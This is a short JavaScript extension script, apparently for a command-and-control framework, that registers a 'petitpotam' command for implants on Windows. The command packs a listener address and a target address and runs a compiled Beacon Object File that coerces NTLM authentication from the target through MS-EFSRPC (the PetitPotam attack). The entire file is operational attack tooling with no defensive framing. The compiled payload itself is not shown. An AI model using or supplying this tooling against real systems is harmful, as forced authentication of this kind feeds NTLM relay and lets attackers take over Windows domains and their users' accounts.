var metadata = {
    name: "PetitPotam-BOF",
    description: "Coerce NTLM authentication via MS-EFSRPC (PetitPotam)"
};

/// COMMANDS

var cmd_petitpotam = ax.create_command("petitpotam", "Coerce NTLM authentication via MS-EFSRPC (PetitPotam)", "petitpotam 10.0.0.5 10.0.0.10");
cmd_petitpotam.addArgString("listener", true);
cmd_petitpotam.addArgString("target", true);
cmd_petitpotam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let listener = parsed_json["listener"];
    let target   = parsed_json["target"];

    let bof_params = ax.bof_pack("cstr,cstr", [listener, target]);
    let bof_path = ax.script_dir() + "_bin/petitpotam." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof -a "${bof_path}" ${bof_params}`, "PetitPotam: Coerce NTLM auth via MS-EFSRPC");
});

var group_petitpotam = ax.create_commands_group("PetitPotam-BOF", [cmd_petitpotam]);
ax.register_commands_group(group_petitpotam, ["beacon", "gopher", "kharon"], ["windows"], []);
